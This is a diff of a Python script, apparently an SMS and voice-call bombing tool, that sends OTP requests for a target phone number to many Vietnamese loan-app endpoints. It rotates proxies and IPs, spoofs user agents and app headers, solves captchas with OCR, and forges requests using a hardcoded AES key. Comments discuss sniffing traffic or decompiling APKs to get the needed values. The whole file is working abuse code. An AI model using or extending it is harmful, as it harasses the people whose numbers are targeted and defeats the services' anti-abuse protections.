@@ -1,4 +1,5 @@
 import sys
+import hmac
 import random
 import string
 import httpx
@@ -19,9 +20,7 @@ from PIL import ImageFile, Image, ImageEnhance
 import ddddocr
 
 ImageFile.LOAD_TRUNCATED_IMAGES = True
-_ocr      = ddddocr.DdddOcr(show_ad=False)
-_ocr_beta = ddddocr.DdddOcr(show_ad=False, beta=True)
-_ocr_old  = ddddocr.DdddOcr(show_ad=False, old=True)
+_ocr = ddddocr.DdddOcr(show_ad=False)
 
 
 
@@ -90,7 +89,7 @@ async def _doi_ip():
     try:
         async with httpx.AsyncClient(timeout=10) as c:
             r = await c.get(_current_change_ip_url())
-        print(f"[ChangeIP] {r.status_code} — {r.text[:100]}")
+        print(f"[ChangeIP] {r.status_code}  ")
         _rotate_proxy_index()
     except Exception as e:
         print(f"Okay")
@@ -100,12 +99,19 @@ _XMH_UA_POOL = [
     "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.200 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.86 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.200 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.135 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.86 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 13; Redmi Note 13 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.100 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
+    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (Linux; Android 14; SM-A546E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.88 Mobile Safari/537.36",
 ]
 
@@ -133,6 +139,11 @@ TEN = [
 ]
 
 
+
+def _rand_ua() -> str:
+    return random.choice(_XMH_UA_POOL)
+
+
 def random_vietnamese_name():
     return f"{random.choice(HO)} {random.choice(TEN_DEM)} {random.choice(TEN)}"
 
@@ -151,7 +162,7 @@ def generate_email():
     return f"{username}@gmail.com"
 
 
-email = generate_email()
+email_ok = generate_email()
 
 
 def get_random_ip():
@@ -171,59 +182,34 @@ def gen_device_id():
 
 
 def _qq_solve(b64_str: str) -> str:
-    """Giải captcha ảnh dùng nhiều model OCR + nhiều kiểu tiền xử lý rồi vote."""
-    def _read(pil_img, model=_ocr) -> str:
+    def _ocr_buf(pil_img) -> str:
         buf = io.BytesIO()
         pil_img.convert("RGB").save(buf, format="PNG")
-        try:
-            r = model.classification(buf.getvalue())
-            return r.strip() if isinstance(r, str) else ""
-        except Exception:
-            return ""
+        r = _ocr.classification(buf.getvalue())
+        return r.strip() if isinstance(r, str) else ""
 
     try:
         raw = base64.b64decode(b64_str)
         img = Image.open(io.BytesIO(raw))
         img.load()
-        rgb = img.convert("RGB")
-        gray = img.convert("L")
-
-        # Tạo danh sách ảnh biến thể
-        variants = [
-            rgb,
-            img.resize((img.width * 3, img.height * 3), Image.LANCZOS).convert("RGB"),
-            img.resize((img.width * 4, img.height * 4), Image.LANCZOS).convert("RGB"),
-            ImageEnhance.Contrast(rgb).enhance(2.0),
-            ImageEnhance.Contrast(rgb).enhance(3.0),
-            ImageEnhance.Sharpness(rgb).enhance(2.5),
-            gray.convert("RGB"),
-            ImageEnhance.Contrast(gray.convert("RGB")).enhance(3.0),
-            # binary threshold
-            gray.point(lambda p: 255 if p > 128 else 0).convert("RGB"),
-            gray.point(lambda p: 255 if p > 100 else 0).convert("RGB"),
-            # invert (dark bg, light text)
-            ImageEnhance.Contrast(
-                Image.fromarray(255 - __import__("numpy").array(gray)).convert("RGB")
-            ).enhance(2.0) if True else rgb,
-        ]
-
-        candidates: list[str] = []
-        for v in variants:
-            for model in (_ocr, _ocr_beta, _ocr_old):
-                res = _read(v, model)
-                if res:
-                    candidates.append(res)
-
-        if not candidates:
-            return ""
-
-        # Chọn kết quả có độ dài ≥ 4 và xuất hiện nhiều nhất (voting)
-        from collections import Counter
-        valid = [c for c in candidates if len(c) >= 4]
-        if valid:
-            return Counter(valid).most_common(1)[0][0]
-        # Nếu không có kết quả ≥4 ký tự, trả về kết quả dài nhất
-        return max(candidates, key=len)
+        candidates = []
+        r1 = _ocr_buf(img)
+        if len(r1) >= 4:
+            return r1
+        candidates.append(r1)
+        r2 = _ocr_buf(ImageEnhance.Contrast(img.convert("RGB")).enhance(2.0))
+        if len(r2) >= 4:
+            return r2
+        candidates.append(r2)
+        r3 = _ocr_buf(img.convert("L").convert("RGB"))
+        if len(r3) >= 4:
+            return r3
+        candidates.append(r3)
+        r4 = _ocr_buf(ImageEnhance.Contrast(img.convert("L").convert("RGB")).enhance(3.0))
+        if len(r4) >= 4:
+            return r4
+        candidates.append(r4)
+        return str(max(candidates, key=len))
     except Exception:
         return ""
 
@@ -241,70 +227,29 @@ def _t24h_jwt_remaining(tok: str) -> int:
 
 def _load_appcheck_token(app_id: str) -> str:
     import pathlib as _pl
-    candidates = [
-        _pl.Path(__file__).parent / "tokens.json",
-        _pl.Path("/root/tokens.json"),
-    ]
-    for p in candidates:
-        try:
-            if not p.exists():
-                continue
-        except (PermissionError, OSError):
-            continue
-        try:
-            data = json.loads(p.read_text(encoding="utf-8"))
-            for app in data.get("apps", []):
-                if app.get("id") == app_id:
-                    tok = app.get("firebaseAppCheck") or ""
-                    if not tok:
-                        print(f"[tokens.json] ⚠️  [{app_id}] chưa có token — chạy grab-jwt trước")
-                        return ""
-                    remaining = _t24h_jwt_remaining(tok)
-                    if remaining > 120:
-                        return tok
-                    print(f"[tokens.json] ⚠️  [{app_id}] token hết hạn ({remaining}s còn lại) — đang chờ grab-jwt refresh")
+    p = _pl.Path(__file__).parent / "tokens.json"
+    if not p.exists():
+        print(f"[tokens.json]  Khng tm thy {p}  chy grab-jwt trc")
+        return ""
+    try:
+        data = json.loads(p.read_text(encoding="utf-8"))
+        for app in data.get("apps", []):
+            if app.get("id") == app_id:
+                tok = app.get("firebaseAppCheck") or ""
+                if not tok:
+                    print(f"[tokens.json]   [{app_id}] cha c token  chy grab-jwt trc")
                     return ""
-            print(f"[tokens.json] ⚠️  Không tìm thấy app_id='{app_id}' trong {p}")
-            return ""
-        except Exception as e:
-            print(f"[tokens.json] ❌ Lỗi đọc {p}: {e}")
-    print(f"[tokens.json] ❌ Không tìm thấy tokens.json")
-    return ""
+                remaining = _t24h_jwt_remaining(tok)
+                if remaining > 120:
+                    return tok
+                print(f"[tokens.json]   [{app_id}] token ht hn ({remaining}s cn li)  chy grab-jwt refresh")
+                return ""
+        print(f"[tokens.json]   Khng tm thy app_id='{app_id}' trong {p}")
+        return ""
+    except Exception as e:
+        print(f"[tokens.json]  Li c {p}: {e}")
+        return ""
 
-
-def _load_gt365_captcha() -> str:
-    import pathlib as _pl
-    candidates = [
-        _pl.Path(__file__).parent / "tokens.json",
-        _pl.Path("/root/tokens.json"),
-    ]
-    for p in candidates:
-        try:
-            if not p.exists():
-                continue
-        except (PermissionError, OSError):
-            continue
-        try:
-            data = json.loads(p.read_text(encoding="utf-8"))
-            for app in data.get("apps", []):
-                if app.get("id") == "gt365":
-                    tok = app.get("captchaToken") or ""
-                    if tok:
-                        return tok
-                    print("[tokens.json] ⚠️  [gt365] chưa có captchaToken — chạy grab-jwt trước")
-                    return ""
-            print("[tokens.json] ⚠️  Không tìm thấy id='gt365' trong tokens.json")
-            return ""
-        except Exception as e:
-            print(f"[tokens.json] ❌ Lỗi đọc {p}: {e}")
-    print("[tokens.json] ❌ Không tìm thấy tokens.json")
-    return ""
-
-
-_CV2_IOS_UA = (
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
-    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1"
-)
 _CV2_AND_UA_POOL = [
     "Dalvik/2.1.0 (Linux; U; Android 14; Pixel 8 Pro)",
     "Dalvik/2.1.0 (Linux; U; Android 13; SM-G998B)",
@@ -315,7 +260,7 @@ _CV2_AND_UA_POOL = [
 
 
 def _cv2_hdrs(origin: str, mode: str = "android") -> dict:
-    ua = _CV2_IOS_UA if mode == "ios" else random.choice(_CV2_AND_UA_POOL)
+    ua = _XMH_UA_POOL if mode == "ios" else random.choice(_CV2_AND_UA_POOL)
     base = origin.rstrip("/")
     return {
         "Accept": "application/json, text/plain, */*",
@@ -351,7 +296,7 @@ async def _cv2_send(
         hdrs = _cv2_hdrs(origin or api_url.split("/v2")[0], mode)
         if extra_hdrs:
             hdrs.update(extra_hdrs)
-        async with httpx.AsyncClient(timeout=20, verify=False) as client:
+        async with httpx.AsyncClient(timeout=20, proxy=_current_proxy()) as client:
             r = await client.post(api_url, json=payload, headers=hdrs)
         biz_code = ""
         try:
@@ -362,17 +307,13 @@ async def _cv2_send(
         except Exception:
             ok = r.status_code in (200, 201)
             msg = r.text[:200].replace("\n", " ")
-        if ok:
-            print(f"[{label}] ✅ OK")
-        else:
-            print(f"[{label}] ❌ {msg or biz_code}")
         return ok
     except Exception as exc:
         print(f"[{label}] ERR {type(exc).__name__}: {exc}")
         return False
 
 
-# ── App-Send core ──
+#  App-Send core 
 _APP_UA_IOS = "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
 _APP_UA_CF  = "WorkHome/20 CFNetwork/1568.200.51 Darwin/24.1.0"
 _APP_UA_CF2 = "laviFinance/1 CFNetwork/1568.200.51 Darwin/24.1.0"
@@ -387,7 +328,7 @@ def _xmh_local_phone(phone: str) -> str:
     return p
 
 
-def _app_body_full(ownership: str, app_version: str = "1.1.0"):
+def _app_body_full(ownership: str, app_version: str = "1.0.0"):
     def _build(phone: str, figure_veri) -> dict:
         return {
             "i18n": "vi_VN",
@@ -435,6 +376,9 @@ async def _app_send(
     proxy=None,
     _retry: bool = True,
 ) -> bool:
+    def _msg(d, r):
+        return d.get("message") or r.text[:80]
+
     if proxy is None:
         proxy = _current_proxy()
 
@@ -443,39 +387,29 @@ async def _app_send(
             r1 = await c.post(
                 f"{base_url}{endpoint}", headers=headers_fn(), json=make_body(phone, False)
             )
-            if r1.status_code != 200:
-                print(f"[{label}] HTTP {r1.status_code}: {r1.text[:120]}")
-                return False
-            d1 = r1.json()
-            code1 = str(d1.get("code", ""))
-            if code1 == "0":
-                print(f"[{label}] ✅ OK (lần 1, không cần captcha)")
+            d1 = r1.json() if r1.status_code == 200 else {}
+            if str(d1.get("code", "")) == "0":
+                print(f"  [{label}] ✓ {phone}")
                 return True
             cap_b64 = (d1.get("data") or {}).get(cap_key, "")
             if not cap_b64:
-                print(f"[{label}] server từ chối: {d1.get('message') or r1.text[:120]}")
+                print(f"  [{label}] ✗ {phone}  {d1.get('message') or r1.status_code}")
                 return False
             answer = _qq_solve(cap_b64)
             if not answer:
-                print(f"[{label}] OCR thất bại — captcha len={len(cap_b64)}")
+                print(f"[{label}] OCR fail  captcha len={len(cap_b64)}")
                 return False
             r2 = await c.post(
                 f"{base_url}{endpoint}", headers=headers_fn(), json=make_body(phone, answer)
             )
-            if r2.status_code != 200:
-                print(f"[{label}] HTTP {r2.status_code} (sau captcha): {r2.text[:120]}")
-                return False
-            d2 = r2.json()
+            d2 = r2.json() if r2.status_code == 200 else {}
             ok = str(d2.get("code", "")) == "0"
-            if ok:
-                print(f"[{label}] ✅ OK (captcha={answer!r})")
-            else:
-                print(f"[{label}] ❌ server từ chối (sau captcha): {d2.get('message') or r2.text[:120]}")
+            print(f"  [{label}] {'✓' if ok else '✗'} {phone}  {d2.get('message') or r2.status_code}")
             return ok
     except Exception as e:
         print(f"[{label}] ERR {type(e).__name__}: {e}")
         if _retry:
-            print(f"[{label}] retry lần 2...")
+            print(f"[{label}] retry lan 2...")
             return await _app_send(
                 phone, base_url, endpoint, headers_fn, make_body, label,
                 cap_key=cap_key, proxy=proxy, _retry=False,
@@ -483,7 +417,7 @@ async def _app_send(
         return False
 
 
-# ── QuickQuang ──
+#  QuickQuang 
 _QQ_APP_BASE = "https://ang.quickquangapp.com"
 
 
@@ -517,7 +451,7 @@ async def Call_QQ_Voice(phone):
     )
 
 
-# ── WanPay Financial ──
+#  WanPay Financial 
 _WAN_APP_BASE = "https://wan.wanpaya.com"
 
 
@@ -551,7 +485,7 @@ async def Call_Wan_Voice(phone):
     )
 
 
-# ── PtVayNhanh ──
+#  PtVayNhanh 
 _PTV_APP_BASE = "https://app.phuthinhvay.com"
 
 
@@ -585,7 +519,7 @@ async def Call_PTV_Voice(phone):
     )
 
 
-# ── LaviFinance ──
+#  LaviFinance 
 _LAVI_APP_BASE = "https://tin.lavifinancecompany.com"
 
 
@@ -596,12 +530,16 @@ def _lavi_app_hdrs():
         "Accept-Encoding": "identity",
         "encrypted": "0",
         "encryptType": "0",
+        "disturbedUrl": "1",
+        "disturbedPar": "1",
         "ownerShip": "laviFinance_ios",
+        "Origin": _LAVI_APP_BASE,
+        "Referer": _LAVI_APP_BASE + "/",
         "User-Agent": _APP_UA_CF2,
     }
 
 
-_lavi_app_body_raw = _app_body_simple("laviFinance_ios")
+_lavi_app_body_raw = _app_body_full("laviFinance_ios")
 
 
 def _lavi_app_body(phone: str, figure_veri):
@@ -620,7 +558,7 @@ async def Call_Lavi_Voice(phone):
     )
 
 
-# ── VayNhanh ──
+#  VayNhanh 
 _VAY_NHANH_BASE = "https://lend.vtnhanh.com"
 
 
@@ -649,7 +587,14 @@ async def Vay_Nhanh_SMS(phone):
     )
 
 
-# ── FBFinance (PublicBankAMC) ──
+async def Vay_Nhanh_Voice(phone):
+    return await _app_send(
+        phone, _VAY_NHANH_BASE, "/base/xmh/getVoiceCode",
+        _vay_nhanh_hdrs, _vnhanh_app_body, "VayNhanh-Voice",
+    )
+
+
+#  FBFinance (PublicBankAMC) 
 _FB_FINANCE_BASE = "https://max.vpamc.com"
 
 
@@ -678,8 +623,49 @@ async def FB_Finance_SMS(phone):
     )
 
 
-# ── SeaBankAsset ──
+async def FB_Finance_Voice(phone):
+    return await _app_send(
+        phone, _FB_FINANCE_BASE, "/base/xmh/getVoiceCode",
+        _fb_finance_hdrs, _fbfinance_app_body, "FBFinance-Voice",
+    )
+
+# App: "Tiền Phong Linh Hoạt" – Android package: com.miducoinvestment.loan.vn
+# ownerShip cần sniff từ traffic thật hoặc decompile APK.
+# Candidates: "tienphonglinhhoa_ios" | "miducotienphong_ios" | "tienphong_ios"
+# (tgyz_ios là sai – trả về 9999 "Thông tin không đầy đủ")
+_TP_APP_BASE      = "https://vne.miducoinvestment.com"
+_TP_OWNERSHIP     = "tienphonglinhhoa_ios"   # TODO: xác nhận bằng traffic sniff
+
+
+def _tp_app_hdrs():
+    return {
+        "Content-Type": "application/json",
+        "Accept": "application/json, text/plain, */*",
+        "encrypted": "0",
+        "encryptType": "0",
+        "disturbedUrl": "1",
+        "disturbedPar": "1",
+        "ownerShip": _TP_OWNERSHIP,
+        "Origin": _TP_APP_BASE,
+        "Referer": _TP_APP_BASE + "/",
+        "User-Agent": random.choice(_XMH_UA_POOL),
+    }
+
+
+_tp_app_body = _app_body_full(_TP_OWNERSHIP)
+
+
+async def Call_TP_SMS(phone):
+    return await _app_send(
+        phone, _TP_APP_BASE, "/base/xmh/getSMSCode", _tp_app_hdrs, _tp_app_body, "TP-SMS"
+    )
+
+
+
+#  SeaBankAsset 
 _SEABANK_ASSET_BASE = "https://lend.seabankassetcompany.com"
+
+
 
 
 def _seabankasset_hdrs():
@@ -701,33 +687,17 @@ def _seabankasset_hdrs():
     }
 
 
-def _seabankasset_body(phone: str, figure_veri) -> dict:
-    return {
-        "i18n": "hi_IN",
-        "reqSource": "Ios",
-        "phoneName": "",
-        "appVersion": "1.0.0",
-        "androidversion": "iPhone18.1",
-        "deviceID": uuid.uuid4().hex,
-        "pagingData": 0,
-        "exquisiteItemType": 1,
-        "ownerShip": "sealend_ios",
-        "uuid": "",
-        "token": "",
-        "phoneNo": phone,
-        "veriType": "LOGIN",
-        "figureVeri": figure_veri if figure_veri else "",
-    }
+_seabank_app_body = _app_body_full("sealend_ios")
+
 
 
 async def seabankasset(phone):
     return await _app_send(
         phone, _SEABANK_ASSET_BASE, "/base/xmh/getSMSCode",
-        _seabankasset_hdrs, _seabankasset_body, "SeaBan-SMS",
+        _seabankasset_hdrs, _seabank_app_body, "SeaBank-SMS",
     )
 
-
-# ── AChauLoan ──
+#  AChauLoan 
 _ACHAU_APP_BASE = "https://tien.achauloan.com"
 
 
@@ -766,7 +736,7 @@ async def Call_AChau_SMS(phone):
     )
 
 
-# ── PetroVay (GPAMCloan) ──
+#  PetroVay (GPAMCloan) 
 _PETRO_APP_BASE = "https://loan.gpamcloan.com"
 
 
@@ -785,7 +755,7 @@ def _petro_app_hdrs():
     }
 
 
-_petro_app_body = _app_body_full("GPAMCloan_ios")
+_petro_app_body = _app_body_full("GPAMCloan_ios", "1.1.4")
 
 
 async def Call_Petro_SMS(phone):
@@ -802,7 +772,37 @@ async def Call_Petro_Voice(phone):
     )
 
 
-# ── Hataco (HTC) ──
+_blue = "https://max.blueshiploan.com"
+
+
+def _blue_hdrs():
+    return {
+        "Content-Type": "application/json",
+        "Accept": "application/json, text/plain, */*",
+        "encrypted": "0",
+        "encryptType": "0",
+        "disturbedUrl": "1",
+        "disturbedPar": "1",
+        "ownerShip": "miducovaytien_ios",
+        "Origin": _blue,
+        "Referer": _blue + "/",
+        "User-Agent": random.choice(_XMH_UA_POOL),
+    }
+
+
+_blue_app_body = _app_body_full("miducovaytien_ios", app_version="1.0.2")
+
+
+async def Call_Blue_SMS(phone):
+    return await _app_send(
+        phone, _blue, "/base/xmh/getSMSCode",
+        _blue_hdrs, _blue_app_body, "Blue-SMS",
+    )
+
+
+
+
+#  Hataco (HTC) 
 _HTC_APP_BASE = "https://tin.hatacocompany.com"
 
 
@@ -838,77 +838,54 @@ async def Call_HTC_Voice(phone):
     )
 
 
-# ── RiveCredit ──
-_REVE_APP_BASE = "https://lend.revecredit.com"
+
+# App tại pho.tienphongcompany.com – có thể là app khác với com.miducoinvestment.loan.vn
+# ownerShip chưa xác định – cần sniff traffic từ app Android tương ứng
+_TIENPHONG_APP_BASE  = "https://pho.tienphongcompany.com"
+_TIENPHONG_OWNERSHIP = "TODO_sniff_ownerShip"  # cần sniff – "tgyz_ios" sai
 
 
-def _reve_app_hdrs():
+def _tienphong_app_hdrs():
     return {
         "Content-Type": "application/json",
         "Accept": "application/json, text/plain, */*",
         "encrypted": "0",
-        "encrypttype": "0",
-        "disturbedurl": "0",
-        "disturbedpar": "1",
-        "ownership": "RiveCredit_ios",
-        "User-Agent": "vnRive/5 CFNetwork/1568.200.51 Darwin/24.1.0",
+        "encryptType": "0",
+        "disturbedUrl": "1",
+        "disturbedPar": "1",
+        "ownerShip": _TIENPHONG_OWNERSHIP,
+        "Origin": _TIENPHONG_APP_BASE,
+        "Referer": _TIENPHONG_APP_BASE + "/",
+        "User-Agent": random.choice(_XMH_UA_POOL),
     }
 
 
-_reve_app_body_raw = _app_body_simple("RiveCredit_ios")
+_tienphong_app_body = _app_body_full(_TIENPHONG_OWNERSHIP)
 
 
-def _reve_app_body(phone: str, figure_veri):
-    return _reve_app_body_raw(_xmh_local_phone(phone), figure_veri)
-
-
-async def Call_Reve_SMS(phone):
+async def Call_TienPhong_SMS(phone):
+    if _TIENPHONG_OWNERSHIP.startswith("TODO"):
+        print("[TienPhong] SKIP – chưa có ownerShip thật (sửa _TIENPHONG_OWNERSHIP)")
+        return False
     return await _app_send(
-        phone, _REVE_APP_BASE, "/base/xmh/getSMSCode",
-        _reve_app_hdrs, _reve_app_body, "Reve-SMS",
+        phone, _TIENPHONG_APP_BASE, "/base/xmh/getSMSCode",
+        _tienphong_app_hdrs, _tienphong_app_body, "TienPhong-SMS",
     )
 
 
-async def Call_Reve_Voice(phone):
+async def Call_TienPhong_Voice(phone):
+    if _TIENPHONG_OWNERSHIP.startswith("TODO"):
+        print("[TienPhong] SKIP – chưa có ownerShip thật (sửa _TIENPHONG_OWNERSHIP)")
+        return False
     return await _app_send(
-        phone, _REVE_APP_BASE, "/base/xmh/getVoiceCode",
-        _reve_app_hdrs, _reve_app_body, "Reve-Voice",
+        phone, _TIENPHONG_APP_BASE, "/base/xmh/getVoiceCode",
+        _tienphong_app_hdrs, _tienphong_app_body, "TienPhong-Voice",
     )
 
 
-_VAYCASH_NET_HDR = {
-    "x-client-type": "phone",
-    "Cookie": "HWWAFSESID=63f6c7f810288e2923; HWWAFSESTIME=1774426765256; PHPSESSID=7aaeabbc2187eeaf2633fb3b2890f364",
-}
 _MARVAY_NEW_BASE = "https://new.marttimeassrt.com"
 
 
-async def Call_MarVay_SMS(phone):
-    return await _cv2_send(
-        phone,
-        "https://mvvai.marttimeassrt.com/v2/login/captcha",
-        {
-            "country_code": "vi", "phone": phone, "app_name": "Mar Vay",
-            "app_package_name": "com.maritme.assrt.vn", "platform": "android",
-            "type": 1, "app_id": "266000000",
-        },
-        "MarVay-SMS",
-        "https://ios-h5.marttimeassrt.com",
-    )
-
-
-async def Call_MarVay_Voice(phone):
-    return await _cv2_send(
-        phone,
-        "https://mvvii.marttimeassrt.com/v2/login/captcha",
-        {
-            "country_code": "vi", "phone": phone, "app_name": "Mar Vay",
-            "app_package_name": "com.maritme.assrt.vn", "platform": "android",
-            "type": 2, "app_id": "266000001",
-        },
-        "MarVay-Voice",
-        "https://ios-h5.marttimeassrt.com",
-    )
 
 
 def _marvay_new_hdrs():
@@ -919,55 +896,98 @@ def _marvay_new_hdrs():
         "encryptType": "0",
         "disturbedUrl": "1",
         "disturbedPar": "1",
-        "ownerShip": "marttimeassrt_ios",
+        "ownerShip": "MarFinyo_ios",
         "Origin": _MARVAY_NEW_BASE,
         "Referer": _MARVAY_NEW_BASE + "/",
         "User-Agent": random.choice(_XMH_UA_POOL),
     }
 
 
-_marvay_new_body = _app_body_full("marttimeassrt_ios")
+_marvay_new_body = _app_body_full("MarFinyo_ios", "1.0.2")
 
 
 async def Call_MarVay_New(phone):
     return await _app_send(
         phone, _MARVAY_NEW_BASE, "/base/xmh/getSMSCode",
         _marvay_new_hdrs, _marvay_new_body, "MarVay-New",
-        proxy=None,
     )
 
 
 async def call8(phone):
     headers = {
-        "content-type": "application/json; charset=utf-8",
-        "x-client-type": "phone",
+        "Host": "mvvii.marttimeassrt.com",
+        "Connection": "keep-alive",
+        "sec-ch-ua": '"Chromium";v="130", "Not?A_Brand";v="99"',
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "sec-ch-ua-mobile": "?0",
+        "User-Agent": random.choice(_XMH_UA_POOL),
+        "sec-ch-ua-platform": "iOS",
+        "Origin": "https://ios-h5.marttimeassrt.com",
+        "Sec-Fetch-Site": "same-site",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Dest": "empty",
+        "Referer": "https://ios-h5.marttimeassrt.com/",
+        "Accept-Language": "vi-VN,vi;q=0.9",
     }
     payload = {
         "country_code": "vi", "phone": phone, "app_name": "Mar Vay",
         "app_package_name": "com.maritme.assrt.vn", "platform": "android",
-        "app_id": "266000001", "type": 2,
+        "app_id": "266000001", "type": 2
     }
     try:
-        async with _make_client(timeout=20, verify=False) as client:
+        async with httpx.AsyncClient(timeout=15) as client:
             r = await client.post(
                 "https://mvvii.marttimeassrt.com/v2/login/captcha",
                 json=payload, headers=headers,
             )
-        ok = r.status_code == 200
-        print(f"[call8] {'✅ OK' if ok else f'❌ HTTP {r.status_code}: {r.text[:100]}'}")
-        return ok
+        return r.status_code == 200
     except Exception as e:
         print(f"[call8] ERR {type(e).__name__}: {e}")
         return False
 
 
-# ══════════════════════════════════════════════════════════════════════════════
-# NHÓM 2 — VVAY AES-CBC FRAMEWORK
-# Các dịch vụ dùng chung _vvay_encrypt / _lt_generic:
-#   V88Dong · SenVay · ITake
-# ══════════════════════════════════════════════════════════════════════════════
+async def call1(phone):
+    headers = {
+        "Host": "mvvii.marttimeassrt.com",
+        "Connection": "keep-alive",
+        "sec-ch-ua": '"Chromium";v="130", "Not?A_Brand";v="99"',
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "sec-ch-ua-mobile": "?0",
+        "User-Agent": random.choice(_XMH_UA_POOL),
+        "sec-ch-ua-platform": "iOS",
+        "Origin": "https://ios-h5.marttimeassrt.com",
+        "Sec-Fetch-Site": "same-site",
+        "Sec-Fetch-Mode": "cors",
+        "Sec-Fetch-Dest": "empty",
+        "Referer": "https://ios-h5.marttimeassrt.com/",
+        "Accept-Language": "vi-VN,vi;q=0.9",
+    }
+    payload = {
+        "country_code": "vi",
+        "phone": phone,
+        "app_name": "Mar Vay",
+        "packagename": "com.maritme.assrt.vn",
+        "platform": "android",
+        "app_id": "266000001",
+        "baseurl": "https://mvvii.marttimeassrt.com/",
+        "weburl": "https://mvviw.marttimeassrt.com/",
+        "logo": "assets/dialog/voice_phone.png"
+    }
+    try:
+        async with httpx.AsyncClient(timeout=15) as client:
+            r = await client.post(
+                "https://mvvii.marttimeassrt.com/v2/login/captcha",
+                json=payload, headers=headers,
+            )
+        return r.status_code == 200
+    except Exception as e:
+        print(f"[call1] ERR {type(e).__name__}: {e}")
+        return False
 
-# ── VVay AES-CBC core ──
+
+#  VVay AES-CBC core 
 _VVAY_KEY = b"aajiaozicashmeh5"
 _VVAY_IV  = b"hajiaozicashmeh5"
 
@@ -994,7 +1014,7 @@ def _vvay_decrypt(b64_str: str):
         return text
 
 
-# ── LT Generic (SenVay family) ──
+#  LT Generic (SenVay family) 
 def _lt_rand_path() -> str:
     chars = "0123456789abcdefghijklmnopqrstuvwxyz"
     return "/h5/" + "".join(random.choice(chars) for _ in range(32))
@@ -1022,7 +1042,7 @@ async def _lt_generic(
         "deviceId": device_id,
         "platform": "2",
         "token": "",
-        "x_x_path": _vvay_encrypt_path(path),
+        "x_x_path": _vvay_encrypt(path),
         "loginPlatform": "APP",
         "marketToken": "",
         "Accept": "application/json",
@@ -1036,27 +1056,22 @@ async def _lt_generic(
     }
     body = _vvay_encrypt({"phone": mobile, "isVoice": is_voice, "h5": False})
     try:
-        async with httpx.AsyncClient(timeout=15, verify=False) as client:
+        async with httpx.AsyncClient(timeout=15, proxy=_current_proxy()) as client:
             r = await client.post(
                 f"https://{host}{gw_path}", headers=headers, content=body.encode()
             )
-        if r.status_code == 200:
-            try:
-                d = _vvay_decrypt(r.text.strip())
-            except Exception:
-                print(f"[{label}] ERR không decrypt được response: {r.text[:200]!r}")
-                return False
-            ok = isinstance(d, dict) and (d.get("successful") is True or d.get("code") == 200)
-            if not ok:
-                print(f"[{label}] server từ chối: {d.get('msg') if isinstance(d, dict) else d}")
-            return ok
-        print(f"[{label}] HTTP {r.status_code}: {r.text[:200]!r}")
+        ok = r.status_code == 200
+        if ok:
+            print(f"  [{label}] {phone}  {r.status_code} | {r.text[:80]}")
+        else:
+            print(f"  [{label}] {phone}  {r.status_code} | {r.text[:80]}")
+        return ok
     except Exception as e:
         print(f"[{label}] ERR {type(e).__name__}: {e}")
     return False
 
 
-# ── SenVay ──
+#  SenVay 
 async def Call_SenVay(phone):
     return await _lt_generic(phone, False, "h5.senvayvn.com", "57", "senvay", "1.0.0_1.0.4")
 
@@ -1065,19 +1080,11 @@ async def Call_SenVay_Voice(phone):
     return await _lt_generic(phone, True, "h5.senvayvn.com", "57", "senvay", "1.0.0_1.0.4")
 
 
-# ── LuckyTien ──
-async def Call_LuckyTien(phone):
-    return await _lt_generic(phone, False, "h5.luckytien.com", "58", "luckytien", "1.0.0_1.0.2")
 
-
-async def Call_LuckyTien_Voice(phone):
-    return await _lt_generic(phone, True, "h5.luckytien.com", "58", "luckytien", "1.0.0_1.0.2")
-
-
